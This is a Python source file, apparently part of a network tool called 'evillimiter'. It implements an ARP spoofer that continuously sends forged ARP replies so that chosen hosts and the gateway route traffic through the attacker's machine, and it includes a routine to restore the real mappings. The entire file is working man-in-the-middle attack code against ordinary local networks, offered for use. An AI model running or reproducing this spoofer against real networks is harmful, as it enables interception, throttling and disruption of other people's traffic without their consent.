import time
import threading
import netifaces
from scapy.all import Ether, ARP, sendp

from .host import Host
from evillimiter.common.globals import BROADCAST


class ARPSpoofer:
    def __init__(self, interface: str, gateway_ip: str, gateway_mac: str) -> None:
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self._own_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']

        self.interval: int = 2

        self._hosts: set[Host] = set()
        self._hosts_lock = threading.Lock()
        self._running = False

    def add(self, host: Host) -> None:
        with self._hosts_lock:
            self._hosts.add(host)

        host.spoofed = True

    def remove(self, host: Host, restore: bool = True) -> None:
        with self._hosts_lock:
            self._hosts.discard(host)

        if restore:
            self._restore(host)

        host.spoofed = False

    def start(self) -> None:
        thread = threading.Thread(target=self._spoof, daemon=True)
        self._running = True
        thread.start()

    def stop(self) -> None:
        self._running = False

    def _spoof(self) -> None:
        while self._running:
            self._hosts_lock.acquire()
            hosts = self._hosts.copy()
            self._hosts_lock.release()

            for host in hosts:
                if not self._running:
                    return

                try:
                    self._send_spoofed_packets(host)
                except Exception:
                    pass

            time.sleep(self.interval)

    def _send_spoofed_packets(self, host: Host) -> None:
        # Unicast ARP reply to gateway: "target IP is at our MAC"
        pkt_to_gateway = (
            Ether(dst=self.gateway_mac)
            / ARP(op=2, hwsrc=self._own_mac, psrc=host.ip,
                  hwdst=self.gateway_mac, pdst=self.gateway_ip)
        )
        # Unicast ARP reply to target: "gateway IP is at our MAC"
        pkt_to_target = (
            Ether(dst=host.mac)
            / ARP(op=2, hwsrc=self._own_mac, psrc=self.gateway_ip,
                  hwdst=host.mac, pdst=host.ip)
        )

        sendp(pkt_to_gateway, verbose=0, iface=self.interface)
        sendp(pkt_to_target, verbose=0, iface=self.interface)

    def _restore(self, host: Host) -> None:
        pkt_to_gateway = (
            Ether(dst=self.gateway_mac)
            / ARP(op=2, hwsrc=host.mac, psrc=host.ip,
                  hwdst=BROADCAST, pdst=self.gateway_ip)
        )
        pkt_to_target = (
            Ether(dst=host.mac)
            / ARP(op=2, hwsrc=self.gateway_mac, psrc=self.gateway_ip,
                  hwdst=BROADCAST, pdst=host.ip)
        )

        sendp(pkt_to_gateway, verbose=0, iface=self.interface, count=3)
        sendp(pkt_to_target, verbose=0, iface=self.interface, count=3)
